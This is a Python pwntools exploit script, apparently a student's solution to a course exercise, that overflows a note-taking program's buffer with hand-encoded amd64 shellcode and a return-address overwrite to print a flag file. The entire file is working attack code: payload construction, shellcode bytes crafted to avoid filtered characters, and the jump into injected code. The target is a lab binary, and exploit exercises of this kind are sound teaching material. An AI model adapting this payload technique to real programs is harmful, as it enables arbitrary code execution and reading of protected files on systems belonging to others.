#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise6/exercise6b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
# pause()

print(r.recvline())     # Enter function
r.sendline(b'1')        # Add note

print(r.recvline())     # Enter your note

elf = ELF(exe)
ret_addr = p64(elf.symbols['reverse_buffer']+8)

shellcode_txt = pwnlib.shellcraft.amd64.linux.cat("/home/student/flag")
shellcode = asm(shellcode_txt)

# with open('shellcode.txt', 'w') as f:
#     f.write(shellcode_txt)
# exit()

# with open('shellcode.txt', 'r') as f:
#     shellcode_txt = f.read()
# print(f'Shellcode Type - {type(shellcode_txt)}')
# print(f'Shellcode - \n{shellcode_txt}')
# shellcode = asm(shellcode_txt)
# with open('shellcode_asm.txt', 'wb') as f:
#     f.write(shellcode)
# shellcode = shellcode + p64(0)[:8-len(shellcode)%8]


shellcode = b'\x80A\x43\x01\x80A\x44\x01\x80A\x69\x01\x80A\x6a\x01h`f\x01\x01\x814$\x01\x01\x01\x01H\xb8udent/flPH\xb8/home/stPj\x02XH\x89\xe7\xbe\x01\x01\x01\x01\x81\xee\x01\x01\x01\x01\x0e\x04A\xba\x01\x01\x01\x01A\x81\xea\x02\x01\x01\x01H\x89\xc6j(Xj\x01_H\xc7\xc2\x01\x01\x01\x01H\x81\xea\x01\x01\x01\x01\x0e\x04'

print(f'Shellcode length - {len(shellcode)}')
print(f'Shellcode in assembly - \n{disasm(shellcode)}')
# exit()
# i=0
# while(i<len(shellcode)):
#     print(hex(u32(shellcode[i:i+4])))
#     i+=4

payload = b'A'*40                       # dummy till rcx
payload += shellcode                    # shellcode, no \xff and \xe1
payload += b'B'*(184-len(shellcode))    # dummy (184-72)
payload += b'A'*8                       # rbp
payload += ret_addr                     # jmp [$rcx]

r.sendline(payload)
print(r.recvline())     # note has been appended to notes.txt
print(r.recvline())     # FLAG

